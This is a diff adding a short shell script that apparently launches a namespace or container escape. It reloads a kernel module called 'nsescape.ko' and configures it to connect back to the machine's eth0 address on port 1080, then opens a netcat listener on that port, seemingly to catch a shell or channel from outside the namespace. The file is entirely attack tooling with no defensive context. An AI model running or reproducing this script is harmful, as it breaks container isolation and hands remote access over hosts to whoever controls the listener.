@@ -1,0 +1,4 @@
+#!/bin/sh
+rmmod nsescape
+insmod /root/nsescape.ko $(ip -br a s dev eth0 | awk '{ print $3 }' | sed "s/\/.*/:1080,forever/;s/^/host=tcp:/")
+nc -l -p 1080
